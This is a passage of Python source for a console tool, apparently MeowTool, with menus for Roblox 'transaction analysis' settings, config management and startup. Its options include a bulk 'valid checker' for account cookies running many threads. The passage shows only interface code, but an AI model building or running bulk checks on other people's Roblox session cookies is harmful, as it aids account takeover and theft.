                                                        match settingsTransactionAnalysisGeneralTab:
                                                            case '0':
                                                                whileTrueStage4 = False
                                                            case '1':
                                                                config['Roblox']['TransactionAnalysis']['General']['First_Check_All_Cookies_For_Valid'] ^= True
                                                            case '2' | '3':
                                                                removeLines(10)
                                                                cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Transaction_Analysis, MT_General)}\n\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                                settingsRTAGeneralThreadsEnter = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Number_Of_Threads}: ').strip()
                                                                match settingsTransactionAnalysisGeneralTab:
                                                                    case '2': changeNumberOfThreads('TransactionAnalysis', 'Number_Of_Threads_For_Valid_Checker',        settingsRTAGeneralThreadsEnter, 1000)
                                                                    case '3': changeNumberOfThreads('TransactionAnalysis', 'Number_Of_Threads_For_Transaction_Analysis', settingsRTAGeneralThreadsEnter, 500)
                                                            case '4':
                                                                config['Roblox']['TransactionAnalysis']['General']['Indentation_By_The_Longest_Name'] ^= True
                                                            case 'F' | 'А':
                                                                labelASCII()
                                                            case 'R' | 'К':
                                                                loadConfig(configLoader['Loader']['Current_Config'])
                                                            case _:
                                                                removeLines(10)
                                                        
                                                        autoSaveConfigAndRemoveLinesInSettings(settingsTransactionAnalysisGeneralTab, ('1', '4'), ('0', '1', '4', 'R', 'К'), 10)
                                                # Плейсы
                                                case '2':
                                                    removeLines(8)
                                                    whileTrueStage4 = True
                                                    while whileTrueStage4:
                                                        cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Transaction_Analysis, MT_Places)}\n\n')
                                                        printPlacesRTA()
                                                        cmdWriter(f'{f'  ┃\n [{ANSI.FG.GREEN}+{ANSI.FG.WHITE}] ┃ {MT_Enable_All}\n [{ANSI.FG.RED}-{ANSI.FG.WHITE}] ┃ {MT_Disable_All}\n  ┃\n' if config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places'] else ''} [{ANSI.FG.YELLOW}A{ANSI.FG.WHITE}] ┃ {MT_Add_A_Place_By_ID}\n [{ANSI.FG.YELLOW}S{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(config['Roblox']['TransactionAnalysis']['Places']['Show_Game_ID_Next_To_The_Name'])} {MT_Show_Place_ID_Next_To_The_Name}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                                        settingsRTAPlacesTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                                        match settingsRTAPlacesTab:
                                                            case settingsRTAPlacesTab if settingsRTAPlacesTab.startswith('0'):
                                                                if len(settingsRTAPlacesTab) == 1:
                                                                    whileTrueStage4 = False
                                                            case settingsRTAPlacesTab if settingsRTAPlacesTab.isdigit() and int(settingsRTAPlacesTab) <= len(config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places']):
                                                                placeContextMenuRTA(int(settingsRTAPlacesTab) - 1)
                                                            case 'A' | 'Ф':
                                                                labelASCII()
                                                                cmdWriter(f' {generateVisualPath(MT_Settings, MT_Roblox, MT_Transaction_Analysis, MT_Places)}\n\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Cancel}\n\n')
                                                                settingsRTAPlaceAdd = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_The_Place_ID}: ')
                                                                await addPlaceRTA(settingsRTAPlaceAdd)
                                                            case '+' | '=':
                                                                for place in config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places']:
                                                                    config['Roblox']['TransactionAnalysis']['Places'][str(place)][2] = True
                                                                autoSaveConfig()
                                                            case '-' | '_':
                                                                for place in config['Roblox']['TransactionAnalysis']['Places']['List_Of_Places']:
                                                                    config['Roblox']['TransactionAnalysis']['Places'][str(place)][2] = False
                                                                autoSaveConfig()
                                                            case 'S' | 'Ы':
                                                                config['Roblox']['TransactionAnalysis']['Places']['Show_Game_ID_Next_To_The_Name'] ^= True
                                                                autoSaveConfig()
                                                        labelASCII()
                                                        autoSaveConfigAndRemoveLinesInSettings(settingsRTAPlacesTab, ('+', '=', '-', '_', 'S', 'Ы'), (), 0)
                                                case 'F' | 'А':
                                                    labelASCII()
                                                case 'R' | 'К':
                                                    loadConfig(configLoader['Loader']['Current_Config'])
                                                case _:
                                                    removeLines(8)

                                            autoSaveConfigAndRemoveLinesInSettings(settingsTransactionAnalysisTab, (), ('0', 'R', 'К'), 8)
                                    case 'F' | 'А':
                                        labelASCII()
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                    case _:
                                        removeLines(11)

                                autoSaveConfigAndRemoveLinesInSettings(settingsRobloxTab, (), ('0', 'R', 'К'), 11)
                        # Конфиги
                        case '5':
                            removeLines(11)
                            whileTrueStage2 = True
                            while whileTrueStage2:
                                cmdWriter(f' {generateVisualPath(MT_Settings, MT_Configs)}\n\n')
                                configsList = configFiles()
                                printConfigs(configsList)
                                cmdWriter(f'  ┃\n [{ANSI.FG.YELLOW}U{ANSI.FG.WHITE}] ┃ {MT_Update_List}\n [{ANSI.FG.YELLOW}R{ANSI.FG.WHITE}] ┃ {MT_Reload_Config} ({MT_Bind}: R)\n [{ANSI.FG.YELLOW}S{ANSI.FG.WHITE}] ┃ {enabledOrDisabledOption(configLoader['Saver']['Auto_Save_Changes'])} {MT_Auto_Save_Changes}\n [{ANSI.FG.YELLOW}C{ANSI.FG.WHITE}] ┃ {MT_Create_Config}\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                                configsTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                                match configsTab:
                                    case configsTab if configsTab.startswith('0'):
                                        if len(configsTab) == 1:
                                            whileTrueStage2 = False
                                    case configsTab if (configsTab.isdigit() and int(configsTab) <= len(configsList)):
                                        configContextMenu(configsList[int(configsTab) - 1])
                                    case 'C' | 'С':
                                        labelASCII()
                                        nameOfNewConfig = input(f' {generateVisualPath(MT_Settings, MT_Configs)}\n\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃ {MT_Do_Not_Use_This_Characters}: \\, /, :, *, ?, ", <, >, |\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Cancel}\n\n [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Name_For_New_Config}: ')
                                        createConfig(nameOfNewConfig, configsList)
                                    case 'S' | 'Ы':
                                        configLoader['Saver']['Auto_Save_Changes'] ^= True
                                        open(Path('Settings', 'Configs', '.Loader.toml'), 'w', encoding='utf-8').write(dumps(configLoader))
                                    case 'R' | 'К':
                                        loadConfig(configLoader['Loader']['Current_Config'])
                                labelASCII()
                        case 'F' | 'А':
                            labelASCII()
                        case 'R' | 'К':
                            loadConfig(configLoader['Loader']['Current_Config'])
                        case _:
                            removeLines(11)

                    autoSaveConfigAndRemoveLinesInSettings(settingsTab, (), ('0', 'R', 'К'), 11)
            # О программе
            case 'i' | 'I' | 'ш'| 'Ш':
                removeLines(mainDecorators[0])
                whileTrueStage1 = True
                while whileTrueStage1:
                    cmdWriter(f' {generateVisualPath(MT_About_The_Program)}\n\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃ {MT_You_Are_Using_Version_Of_Program}\n  ┃\n [{ANSI.FG.PINK}U{ANSI.FG.WHITE}] ┃ {MT_Open_Latest_Changes}\n [{ANSI.FG.PINK}G{ANSI.FG.WHITE}] ┃ {MT_Open_MeowTool_On_GitHub}\n [{ANSI.FG.PINK}Y{ANSI.FG.WHITE}] ┃ {MT_Open_The_Showcase_On_YouTube}\n [{ANSI.FG.PINK}T{ANSI.FG.WHITE}] ┃ {MT_Open_PM_With_Developer_In_Telegram} (@L1feeK)\n  ┃\n [{ANSI.FG.YELLOW}0{ANSI.FG.WHITE}] ┃ {MT_Back}\n\n')
                    aboutTheProgramTab = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                    match aboutTheProgramTab:
                        case '0':
                            whileTrueStage1 = False
                        case 'U' | 'Г':
                            openLink(f'https://github.com/h1kken/MeowTool/releases/tag/{VERSION}', 12, generateVisualPath(MT_About_The_Program))
                        case 'G' | 'П':
                            openLink('https://github.com/h1kken/MeowTool', 12, generateVisualPath(MT_About_The_Program))
                        case 'Y' | 'Н':
                            openLink('https://www.youtube.com/live/S_BODxV5vXk', 12, generateVisualPath(MT_About_The_Program))
                        case 'T' | 'Е':
                            openLink('https://t.me/L1feeK', 12, generateVisualPath(MT_About_The_Program))
                        case 'F' | 'А':
                            labelASCII()
                        case 'R' | 'К':
                            loadConfig(configLoader['Loader']['Current_Config'])
                        case _:
                            removeLines(12)

                    autoSaveConfigAndRemoveLinesInSettings(aboutTheProgramTab, (), ('0', 'R', 'К'), 12)
            case 'Meow' | 'Мяу':
                errorOrCorrectHandler(False, f'...{mainTab}! :3', f'{'Hew-hew' if mainTab == 'Meow' else 'Хи-хи'}~')
            # Закрыть программу
            case '0':
                if not config['General']['Disable_Warnings_For_Dangerous_Actions']:
                    removeLines(mainDecorators[0])
                    whileTrueStage1 = True
                    while whileTrueStage1:
                        cmdWriter(f' {generateVisualPath()} \n\n [{ANSI.FG.YELLOW}?{ANSI.FG.WHITE}] ┃ {MT_Do_You_Sure}\n  ┃ \n [{ANSI.FG.GREEN}Y{ANSI.FG.WHITE}] ┃ {MT_I_Am_Sure}\n [{ANSI.FG.RED}N{ANSI.FG.WHITE}] ┃ {MT_Not_Yet}\n\n')
                        confirmTheAction = input(f' [{ANSI.FG.GREEN}<{ANSI.FG.WHITE}] {MT_Enter_Something}: ').upper().strip()
                        match confirmTheAction:
                            case 'Y' | 'Н':
                                await closeProgram()
                            case 'N' | 'Т':
                                whileTrueStage1 = False

                        removeLines(8)
                else:
                    await closeProgram()
            case 'f' | 'F' | 'а' | 'А':
                labelASCII()
            case 'r' | 'R' | 'к' | 'К':
                loadConfig(configLoader['Loader']['Current_Config'])
                removeLines(mainDecorators[0])
            case _:
                removeLines(mainDecorators[0])

if __name__ == '__main__':
    try:
        S = ' '*20
        systemLocale = str(locale.getlocale()[0]).lower()
        translateLoad(systemLocale)
        # Инициализация логгера
        cmdWriter(f'\n  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}<3{ANSI.FG.WHITE}] {MT_Waking_Up_Our_Eared_Helper}... :3{S}\r')
        logger = Logger('MeowTool')
        startLoggerInformation()
        # Проверка папок
        cmdWriter(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}<3{ANSI.FG.WHITE}] {MT_Tidying_Folders_Onto_Their_Little_Shelves}... :3{S}\r')
        createFoldersAndFiles()
        # Загрузка конфиг лоадера
        cmdWriter(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}<3{ANSI.FG.WHITE}] {MT_We_Will_Find_Out_Name_Your_Config_From_Loader}... :3{S}\r')
        loadConfigLoader()
        # Выбор цикла событий
        cmdWriter(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}<3{ANSI.FG.WHITE}] {MT_Cozying_Up_For_Comfort_And_Snugness}... :3{S}\r')
        if sys.platform.lower().startswith('win'):
            if configLoader['Advanced']['Standard_Event_Loop_Policy']:
                asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
            else:
                asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
        # Проверка обновлений
        if configLoader['Updater']['Check_For_Updates']:
            asyncio.run(checkUpdates())
        # Загрузка конфига
        cmdWriter(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}<3{ANSI.FG.WHITE}] {MT_Asking_The_Config_Pretty_Please_For_Settings}... :3{S}\r')
        loadConfig(getConfigOnLoad())
        # Инициализация перевода
        cmdWriter(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}<3{ANSI.FG.WHITE}] {MT_Crossing_Paws_For_Honest_Translations}... :3{S}\r')
        if configLoader['MeowTool']['First_Launch']:
            configsPath = Path('Settings', 'Configs')
            if 'russia' not in systemLocale:
                config['General']['Language'] = 'EN'
                with open(configsPath / f'{configLoader['Loader']['Current_Config']}.toml', 'w', encoding='utf-8') as file:
                    file.write(dumps(config))
            configLoader['MeowTool']['First_Launch'] = False
            autoSaveConfigLoader()
        translateMT(config['General']['Language'])
        # Переименование консоли
        cmdWriter(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}<3{ANSI.FG.WHITE}] {MT_Fantasizing_About_The_Name}... :3{S}\r')
        consoleTitle = str(config['General']['Console_Title']).strip()
        if (not consoleTitle or len(consoleTitle) > 50 or any(char in consoleTitle for char in ['<', '>', '|', '^', '&'])):
            os.system('title MeowTool... Meow :3')
        else:
            os.system(f'title {consoleTitle}')
        # Запуск меню
        cmdWriter(f'  {ANSI.DECOR.BOLD}[{ANSI.FG.PINK}<3{ANSI.FG.WHITE}] {MT_Almost_There_Just_A_Little_Couple_Of_Hours}... :3{S}\r')
        asyncio.run(mainMenu())
    except (SystemExit, KeyboardInterrupt, EOFError):
        raise
    except Exception:
        traceback.print_exc()
        logger.exception(f'{MT_Oh_Noo_My_Home_It_Is_Over}... :<', force=True)

        input(f'\n  [?] Traceback saved to: {ANSI.DECOR.UNDERLINEON}{logger._path}{ANSI.DECOR.UNDERLINEOFF}\n\n  [<] Press Enter to close the program...')
